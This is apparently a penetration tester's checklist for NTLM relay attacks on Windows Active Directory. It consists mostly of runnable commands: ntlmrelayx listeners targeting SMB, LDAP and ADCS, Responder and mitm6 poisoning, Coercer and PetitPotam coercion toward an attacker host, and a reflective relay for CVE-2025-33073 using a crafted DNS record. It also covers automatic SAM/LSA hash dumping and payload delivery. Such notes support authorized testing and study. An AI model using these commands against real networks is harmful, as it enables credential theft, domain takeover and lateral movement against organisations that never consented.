# NTLM relay

- [ ] Not on the OSCP exam: relay and coercion are kept out as a safe reading; OffSec's pages do not name them
- [ ] Not on the OSCP exam: OffSec bans spoofing, including NBNS, and Responder poisoning

## Before I start
- [ ] Signing posture mapped: `nxc smb <Subnet>` and `nxc ldap <DCIP>` — targets with SMB signing OFF are relayable to SMB
nxc smb <Subnet> --gen-relay-list targets.txt
- [ ] Responder running at the same time? Its SMB/HTTP servers OFF (Responder.conf) so ntlmrelayx can serve
- [ ] The plan picked from the target, not the tool: DC machine account → LDAP/ADCS, admin user → SMB

## The listeners
ntlmrelayx.py -t smb://<Target> -smb2support
ntlmrelayx.py -t ldap://<DCIP> --shadow-credentials
ntlmrelayx.py -t http://<CAHost>/certsrv/certfnsh.asp --adcs --template DomainController
- [ ] Want a session instead of a dump: `-i` (interactive on 127.0.0.1:11000) or `-socks`
- [ ] Many targets: `-tf targets.txt -w --keep-relaying`
- [ ] Cross-protocol unsigning relay (SMB in, LDAP out): `--remove-mic`

## Feed it: poisoning
sudo responder -I tun0
sudo mitm6 -d <Domain>
- [ ] ntlmrelayx got `-6` when mitm6 is in play

## Feed it: coercion (any domain cred)
coercer coerce -l <AttackerIP> -t <Target> -u '<User>' -p '<Password>' -d <Domain>
- [ ] Method refused: walk the trigger list — petitpotam, printerbug, dfscoerce, shadowcoerce: :Pb coercion
- [ ] DC machine account relayed to LDAP: shadow credentials or RBCD from here: :Pb acl-abuse
- [ ] DC machine account relayed to ADCS web enrolment: cert as the DC, then :Pb adcs

## SMB relay landing
- [ ] Admin relay → SAM/LSA dumped automatically; hashes saved and reused: :Pb lateral-movement
- [ ] `-e <File>` pushed a payload instead, or `-i` gave the shell

## Reflective relay (CVE-2025-33073, pre-June-2025 targets)
dnstool.py -u '<Domain>\<User>' -p '<Password>' <DCIP> --action add -r "<TARGETNETBIOS>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" -d <AttackerIP>
ntlmrelayx.py -t smb://<TargetFQDN> -smb2support --remove-sign-seal
petitpotam.py -u '<User>' -p '<Password>' -d '<Domain>' "<TARGETNETBIOS>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" <TargetFQDN>
- [ ] DNS record removed after: dnstool.py --action remove -r "<TARGETNETBIOS>1UWhRC..."

## Clean up and next
- [ ] Responder.conf put back, mitm6 stopped (it reverts slowly), rogue DNS records removed
- [ ] Relayed-into-delegation path finished: :Pb delegation
- [ ] Hashes cracked or passed: :Pb windows-creds
